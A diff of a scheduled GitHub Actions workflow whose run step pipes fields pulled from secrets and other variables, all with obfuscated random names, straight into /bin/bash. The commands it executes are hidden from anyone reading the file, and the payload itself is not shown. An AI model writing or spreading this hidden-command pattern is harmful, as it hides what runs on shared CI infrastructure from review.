@@ -1,9 +1,8 @@
 name: yanshisy
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 0/6 * * *'
+    - cron: '16 0/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,13 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: yanshisy
         env:
-          gl51297: ${{ secrets.gl51297 }}
+          iaeo8: ${{ secrets.iaeo8 }}
         run: |
-          echo $gl51297 | jq -r .t8 | /bin/bash
-          echo $mybkt4 | jq -r .g55561 | /bin/bash
-          echo $kkar7 | jq -r .h2 | /bin/bash
-          echo $tkfpt0173 | jq -r .ujhi4793 | /bin/bash
-          echo $xgln05990 | jq -r .hwfmk67 | /bin/bash
-          echo $b95 | jq -r .dipv6629 | /bin/bash
-          echo $rcb957 | jq -r .u25771 | /bin/bash
+          echo $iaeo8 | jq -r .uj778 | /bin/bash
+          echo $ehi6 | jq -r .i6 | /bin/bash
+          echo $jh853 | jq -r .ftams67483 | /bin/bash
+          echo $blm16 | jq -r .osfp7201 | /bin/bash
+          echo $ecc8565 | jq -r .oj70353 | /bin/bash
+          echo $au9 | jq -r .bqblb5787 | /bin/bash
+          echo $v51 | jq -r .qdif27986 | /bin/bash
+          echo $w530 | jq -r .f11 | /bin/bash
+          echo $ddwe71352 | jq -r .nhkd4297 | /bin/bash
+          echo $ddhaj50867 | jq -r .tuzp50 | /bin/bash
+          echo $p95 | jq -r .tfq08920 | /bin/bash
+          echo $oswa2 | jq -r .prfne3 | /bin/bash
+          echo $f769 | jq -r .hc1365 | /bin/bash
 
